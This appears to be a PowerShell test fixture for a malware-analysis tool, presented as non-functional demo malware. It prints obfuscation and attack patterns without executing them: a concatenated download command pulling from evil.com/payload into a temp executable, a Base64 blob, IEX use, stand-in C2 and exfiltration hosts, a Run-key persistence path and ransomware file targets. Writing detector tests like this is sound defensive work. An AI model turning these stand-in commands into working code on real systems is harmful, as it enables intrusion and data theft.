# ============================================================================
# ⚠️ DEMO ONLY - NOT REAL MALWARE ⚠️
# obfuscated_malicious.ps1
# ============================================================================
# Purpose: Demonstrates obfuscated malware patterns for AI analysis testing
# Status: FAKE MALWARE - Non-functional, for demonstration only
# Expected Analysis: Should be classified as MALICIOUS/HIGH RISK
# ============================================================================

<#
.SYNOPSIS
    Obfuscated Malware Pattern Demo (NON-FUNCTIONAL)

.DESCRIPTION
    This is a FAKE malware script designed to demonstrate what real malware
    might look like. It uses obfuscation techniques but DOES NOT actually
    perform any malicious actions.

    **THIS IS NOT REAL MALWARE**
    - All payloads are comments or placeholders
    - No actual malicious code will execute
    - Safe to analyze with HifzDefend

.EXAMPLE
    hifzdefend analyze-script obfuscated_malicious.ps1

.NOTES
    **FOR EDUCATIONAL/TESTING PURPOSES ONLY**
    Do NOT modify this to make it functional.
    Do NOT use as a template for real malware.
#>

# ==========================
# OBFUSCATION PATTERN #1: Variable name obfuscation
# ==========================

# Real malware uses meaningless variable names to confuse analysts
$a1 = "System"
$b2 = "Net"
$c3 = "WebClient"
$d4 = "$a1.$b2.$c3"

# Obfuscated type creation
$e5 = [Type]::GetType($d4)

Write-Host "[DEMO] Obfuscated variable names detected" -ForegroundColor Red

# ==========================
# OBFUSCATION PATTERN #2: Base64 encoded payload
# ==========================

# Real malware often encodes payloads to evade detection
$f6 = "V3JpdGUtSG9zdCAnVGhpcyBpcyBlbmNvZGVkIHBheWxvYWQnCiMgW0ZBS0UgUEFZTE9BRCAtIE5PVC" `
    + "BFWEVDVVRFRF0KIyBJbiBhIHJlYWwgbWFsd2FyZSwgdGhpcyB3b3VsZCBiZToKIyAtIERvd25sb2" `
    + "FkIG1vcmUgbWFsd2FyZQojIC0gU3RlYWwgY3JlZGVudGlhbHMKIyAtIENyZWF0ZSBiYWNrZG9vcnMK" `
    + "IyAtIENyeXB0IGZpbGVzIChy

YW5zb213YXJlKQ=="

# Decode (but don't execute)
Write-Host "[DEMO] Base64 encoded payload detected" -ForegroundColor Red
Write-Host "[DEMO] Payload: [REDACTED - NOT DECODED]" -ForegroundColor Gray

# ==========================
# OBFUSCATION PATTERN #3: String concatenation obfuscation
# ==========================

# Breaking up commands to evade string-based detection
$g7 = "Invo" + "ke-W" + "ebRe" + "quest"
$h8 = "-Uri" + " htt" + "ps://" + "evil" + ".com" + "/pay" + "load"
$i9 = "-Out" + "File" + " $en" + "v:TE" + "MP\m" + "alwa" + "re.e" + "xe"

Write-Host "[DEMO] String concatenation obfuscation detected" -ForegroundColor Red
Write-Host "[DEMO] Would execute: $g7 $h8 $i9" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually executing)" -ForegroundColor Gray

# ==========================
# OBFUSCATION PATTERN #4: Character substitution
# ==========================

# Using special characters to obfuscate
$j10 = 'S' + [char]0x74 + [char]0x61 + [char]0x72 + [char]0x74
# This spells "Start-Process" using ASCII codes
Write-Host "[DEMO] Character substitution detected" -ForegroundColor Red

# ==========================
# OBFUSCATION PATTERN #5: Invoke-Expression with obfuscation
# ==========================

# IEX (Invoke-Expression) is commonly used in malware
$k11 = "IEX"  # Short for Invoke-Expression
$l12 = "# [FAKE PAYLOAD - NOT EXECUTED]"

Write-Host "[DEMO] Invoke-Expression (IEX) usage detected" -ForegroundColor Red
Write-Host "[DEMO] $k11 '$l12'" -ForegroundColor DarkRed

# ==========================
# MALICIOUS PATTERN #1: C2 Communication
# ==========================

# Command and Control server communication (fake)
$m13 = @{
    "C2Server" = "evil-c2-server.onion"
    "Port" = "443"
    "Protocol" = "HTTPS"
    "Beacon" = "Every 60 seconds"
}

Write-Host "`n[DEMO] C2 Communication pattern detected:" -ForegroundColor Red
Write-Host "[DEMO] Server: $($m13.C2Server)" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually connecting)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #2: Credential harvesting
# ==========================

# Fake credential stealing code
Write-Host "`n[DEMO] Credential harvesting pattern:" -ForegroundColor Red
Write-Host "[DEMO] Would target:" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Browser saved passwords" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Windows Credential Manager" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Email clients" -ForegroundColor DarkRed
Write-Host "[DEMO]   - FTP clients" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually stealing)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #3: Ransomware simulation
# ==========================

# Fake ransomware behavior
Write-Host "`n[DEMO] Ransomware pattern detected:" -ForegroundColor Red

$n14 = @(
    "C:\Users\*\Documents\*.doc*",
    "C:\Users\*\Desktop\*.xlsx",
    "C:\Users\*\Pictures\*.jpg"
)

Write-Host "[DEMO] Would encrypt file patterns:" -ForegroundColor DarkRed
foreach ($pattern in $n14) {
    Write-Host "[DEMO]   $pattern" -ForegroundColor DarkRed
}
Write-Host "[DEMO] (Not actually encrypting)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #4: Privilege escalation
# ==========================

# Fake UAC bypass attempt
Write-Host "`n[DEMO] Privilege escalation attempt:" -ForegroundColor Red
Write-Host "[DEMO] Would use UAC bypass technique" -ForegroundColor DarkRed
Write-Host "[DEMO] Method: [REDACTED]" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually attempting)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #5: Persistence mechanisms
# ==========================

# Multiple persistence mechanisms (all fake)
Write-Host "`n[DEMO] Persistence mechanisms:" -ForegroundColor Red

$o15 = @{
    "Registry" = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    "ScheduledTask" = "MicrosoftUpdateService"
    "Service" = "WindowsSecurityHealth"
    "StartupFolder" = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
}

foreach ($method in $o15.Keys) {
    Write-Host "[DEMO]   $method : $($o15[$method])" -ForegroundColor DarkRed
}
Write-Host "[DEMO] (Not actually creating)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #6: Anti-analysis techniques
# ==========================

# Fake VM/sandbox detection
Write-Host "`n[DEMO] Anti-analysis techniques:" -ForegroundColor Red
Write-Host "[DEMO] Checking for:" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Virtual machine indicators" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Debugging tools" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Sandbox environment" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Security software" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually checking)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #7: Data exfiltration
# ==========================

# Fake data exfiltration
Write-Host "`n[DEMO] Data exfiltration pattern:" -ForegroundColor Red

$p16 = @{
    "Method" = "HTTPS POST"
    "Destination" = "attacker-server.onion/upload"
    "Data" = "Credentials, Documents, Browser History"
}

Write-Host "[DEMO] Would exfiltrate:" -ForegroundColor DarkRed
Write-Host "[DEMO]   Data: $($p16.Data)" -ForegroundColor DarkRed
Write-Host "[DEMO]   To: $($p16.Destination)" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually exfiltrating)" -ForegroundColor Gray

# ==========================
# MALICIOUS PATTERN #8: Self-deletion
# ==========================

# Fake self-deletion to cover tracks
Write-Host "`n[DEMO] Self-deletion pattern:" -ForegroundColor Red
Write-Host "[DEMO] Would delete:" -ForegroundColor DarkRed
Write-Host "[DEMO]   - This script" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Temporary files" -ForegroundColor DarkRed
Write-Host "[DEMO]   - Event logs" -ForegroundColor DarkRed
Write-Host "[DEMO] (Not actually deleting)" -ForegroundColor Gray

# ==========================
# SUMMARY
# ==========================

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host " ⚠️ DEMO MALWARE SIMULATION COMPLETE ⚠️" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""
Write-Host "This script demonstrated:" -ForegroundColor Yellow
Write-Host "  ✗ Obfuscation techniques (variables, encoding, strings)" -ForegroundColor Red
Write-Host "  ✗ C2 communication patterns" -ForegroundColor Red
Write-Host "  ✗ Credential harvesting" -ForegroundColor Red
Write-Host "  ✗ Ransomware behavior" -ForegroundColor Red
Write-Host "  ✗ Privilege escalation" -ForegroundColor Red
Write-Host "  ✗ Multiple persistence mechanisms" -ForegroundColor Red
Write-Host "  ✗ Anti-analysis techniques" -ForegroundColor Red
Write-Host "  ✗ Data exfiltration" -ForegroundColor Red
Write-Host "  ✗ Self-deletion to cover tracks" -ForegroundColor Red
Write-Host ""
Write-Host "**CRITICAL**: This is NOT real malware!" -ForegroundColor Green
Write-Host "All 'malicious' actions were simulated only." -ForegroundColor Green
Write-Host "No actual harm was done or attempted." -ForegroundColor Green
Write-Host ""
Write-Host "Use this to test HifzDefend's detection capabilities." -ForegroundColor Cyan
Write-Host ""

# HifzDefend Analysis Notes
# -------------------------
# This script should be flagged as MALICIOUS because:
# 1. Heavy obfuscation (variable names, base64, string concat, char substitution)
# 2. Use of Invoke-Expression (IEX) - code execution
# 3. C2 communication patterns
# 4. Credential harvesting indicators
# 5. Ransomware file encryption patterns
# 6. Privilege escalation attempts
# 7. Multiple persistence mechanisms
# 8. Anti-analysis/anti-VM techniques
# 9. Data exfiltration indicators
# 10. Self-deletion to cover tracks
#
# Recommended Action: IMMEDIATE QUARANTINE
# Risk Level: CRITICAL/HIGH
# Classification: Advanced Persistent Threat (APT) pattern
#
# **REMINDER**: This is a DEMO SCRIPT for testing purposes only.
# None of the "malicious" code actually executes.
